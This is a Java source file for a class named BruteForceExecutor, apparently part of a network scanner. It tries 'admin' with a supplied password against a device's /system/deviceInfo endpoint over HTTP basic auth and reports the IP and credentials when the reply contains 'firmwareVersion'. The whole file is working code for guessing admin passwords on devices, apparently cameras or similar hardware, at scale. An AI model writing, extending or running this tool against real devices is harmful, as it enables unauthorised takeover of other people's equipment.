package scanner;

import lombok.RequiredArgsConstructor;
import lombok.SneakyThrows;
import okhttp3.Response;
import okhttp3.ResponseBody;
import scanner.http.HttpClient;

import java.io.IOException;
import java.util.Base64;
import java.util.Objects;
import java.util.Optional;
import java.util.concurrent.Callable;

@RequiredArgsConstructor
public class BruteForceExecutor implements Callable<Optional<String>> {

    private final String BRUTE = "http://%s/system/deviceInfo";

    private final HttpClient client;
    private final String ip;
    private final String pass;

    @Override
    @SneakyThrows
    public Optional<String> call() {
        String auth = new String(Base64.getEncoder().encode(String.format("admin:%s", pass).getBytes()));
        try (Response response = client.execute(String.format(BRUTE, ip), auth)) {
            ResponseBody responseBody = response.body();
            if (Objects.nonNull(responseBody)) {
                String body = responseBody.string();
                if (body.contains("firmwareVersion"))
                    return Optional.of(ip + " => admin:" + pass);
            }
        } catch (IOException ignored) { }
        return Optional.empty();
    }

}